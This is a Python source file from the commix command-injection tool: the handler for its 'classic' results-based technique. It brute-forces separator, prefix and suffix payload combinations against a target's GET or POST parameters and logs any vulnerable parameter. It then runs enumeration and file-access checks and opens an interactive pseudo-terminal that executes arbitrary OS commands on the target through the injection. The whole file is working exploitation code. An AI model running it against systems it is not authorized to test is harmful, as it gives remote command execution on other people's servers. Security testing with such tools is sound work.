#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation,either version 3 of the License,or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.classic import cb_payloads
from src.core.injections.results_based.techniques.classic import cb_enumeration
from src.core.injections.results_based.techniques.classic import cb_file_access

"""
  The "classic" technique on Result-based OS Command Injection.
"""

#---------------------------------------------
# The "classic" injection technique handler.
#---------------------------------------------
def cb_injection_handler(url,delay,filename,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  export_injection_info = False
  injection_type = "Results-based Command Injection"
  technique = "classic injection technique"
      
  sys.stdout.write("(*) Testing the "+ technique + "... ")
  sys.stdout.flush()
  
  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          i = i + 1

          # Check for bad combination of prefix and separator
          combination = prefix + separator
          if combination in settings.JUNK_COMBINATION:
            prefix = ""

          # Change TAG on every request to prevent false-positive results.
          TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 

          # Check if defined "--base64" option.
          if menu.options.base64_trick == True:
            B64_ENC_TAG = base64.b64encode(TAG)
            B64_DEC_TRICK = settings.B64_DEC_TRICK
          else:
            B64_ENC_TAG = TAG
            B64_DEC_TRICK = ""
            
          # Define alter shell
          alter_shell = menu.options.alter_shell
        
          try:
            if alter_shell:
              # Classic decision payload (check if host is vulnerable).
              payload = cb_payloads.decision_alter_shell(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
            else:
              # Classic decision payload (check if host is vulnerable).
              payload = cb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
            
            # Check if defined "--prefix" option.
            if menu.options.prefix:
              prefix = menu.options.prefix
              payload = prefix + payload
            else:
              payload = prefix + payload
              
            # Check if defined "--suffix" option.
            if menu.options.suffix:
              suffix = menu.options.suffix
              payload = payload + suffix
            else:
              payload = payload + suffix

            if separator == " " :
              payload = re.sub(" ","%20",payload)
            else:
              payload = re.sub(" ",whitespace,payload)

            # Check if defined "--verbose" option.
            if menu.options.verbose:
              sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
              
            # Check if target host is vulnerable.
            response,vuln_parameter = cb_injector.injection_test(payload,http_request_method,url)

            # if need page reload
            if menu.options.url_reload:
              time.sleep(delay)
              response = urllib.urlopen(url)
              
            # Evaluate test results.
            shell = cb_injector.injection_test_results(response,TAG)
            if not menu.options.verbose:
              percent = ((i*100)/total)
              if percent == 100:
                if no_result == True:
                  percent = colors.RED + "FAILED" + colors.RESET
                else:
                  percent = str(percent)+"%"
              elif len(shell) != 0:
                percent = colors.GREEN + "SUCCEED" + colors.RESET
              else:
                percent = str(percent)+"%"
              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
              sys.stdout.flush()
              
          except KeyboardInterrupt: 
            raise
          
          except:
            continue
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False

            # Print the findings to log file.
            if export_injection_info == False:
              output_file = open(filename + ".txt", "a")
              output_file.write("\n(+) Type : " + injection_type)
              output_file.write("\n(+) Technique : " + technique.title())
              output_file.close()
              export_injection_info = True

            if http_request_method == "GET":
              # Print the findings to log file
              if vp_flag == True:
                output_file = open(filename + ".txt","a")
                output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
                output_file.write("\n")
                vp_flag = False
                output_file.close()
                
              counter = counter + 1
              output_file = open(filename + ".txt","a")
              output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20"," ",payload) + "\n")
              output_file.close()
              
              #Vulnerable Parameter
              GET_vuln_param = parameters.vuln_GET_param(url)

              # Print the findings to terminal.
              print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + GET_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
              print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
              print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
              print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET

            else :
              # Print the findings to log file
              if vp_flag == True:
                output_file = open(filename + ".txt","a")
                output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
                output_file.write("\n")
                vp_flag = False
                output_file.close()
                
              counter = counter + 1
              output_file = open(filename + ".txt","a")
              output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20"," ",payload) + "\n")
              output_file.close()
              
              #Vulnerable Parameter
              POST_vuln_param = vuln_parameter
              
              # Print the findings to terminal.
              print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + POST_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
              print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
              print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
              print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET
              
            # Check for any enumeration options.
            cb_enumeration.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)

            # Check for any system file access options.
            cb_file_access.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
            
            # Pseudo-Terminal shell
            while True:
              gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
              if gotshell in settings.CHOISE_YES:
                print ""
                print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
                while True:
                  try:
                    cmd = raw_input("Shell > ")
                    if cmd == "q":
                      sys.exit(0)
                      
                    else:
                      # The main command injection exploitation.
                      response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell)
                      
                      # if need page reload
                      if menu.options.url_reload:
                        time.sleep(delay)
                        response = urllib.urlopen(url)
                        
                      # Command execution results.
                      shell = cb_injector.injection_results(response,TAG)
                      if shell:
                        shell = "".join(str(p) for p in shell)
                        print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"

                  except KeyboardInterrupt: 
                    print ""
                    sys.exit(0)

              elif gotshell in settings.CHOISE_NO:
                if menu.options.verbose:
                  sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                  sys.stdout.flush()
                break
              
              else:
                if gotshell == "":
                  gotshell = "enter"
                print colors.BGRED + "(x) Error: '" + gotshell + "' is not a valid answer." + colors.RESET
                pass
              
  if no_result == True:
    if menu.options.verbose == False:
      print ""
      return False
    else:
      print ""
      return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()
    
def exploitation(url,delay,filename,http_request_method):
  if cb_injection_handler(url,delay,filename,http_request_method) == False:
    return False

#eof